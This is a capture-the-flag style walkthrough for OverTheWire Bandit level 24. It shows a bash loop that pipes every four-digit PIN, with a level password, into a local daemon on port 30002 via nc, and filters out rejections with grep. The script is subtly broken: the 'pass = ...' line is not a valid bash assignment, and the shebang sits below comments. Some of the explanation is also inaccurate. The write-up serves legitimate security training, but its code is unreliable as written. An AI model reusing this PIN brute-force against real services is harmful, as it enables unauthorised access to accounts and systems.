## Level 24
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Requirements
- bash scripting
- nc command
- grep
- pipe operator (|)

## Solution
Lets start by creating a bash script that basically tries to connect to the port by looping over all possible passwords instead of doing it manually
```bash
# for the sake of this segment, let's assume the password for the current level is UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
# the passwords keep changing so replace it with the actual password for bandit24

#!/bin/bash
pass = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for pin in {0000..9999}
do
    echo "$pass $pin"
done | nc localhost 30002
```
The above script tries to brute force all the combinations on the port till it gets a connection. The `nc localhost 30002` command, followed by the pipe operator, basically is the script just generating all the possible combinations then "piping" or plugging all the info in the give port.

```bash
# Make the script executable
$ chmod +x myscript.sh

# Now execute the script with grep -v, which basically ignores all the patterns that match
$ ./myscript.sh | grep -v "Wrong"
```
The `grep -v "Wrong"` basically invert matches the outputs of the script to display everything except the lines that start with the word "Wrong". We do this to not clutter our screen with all the "Wrong password" inputs from the port.
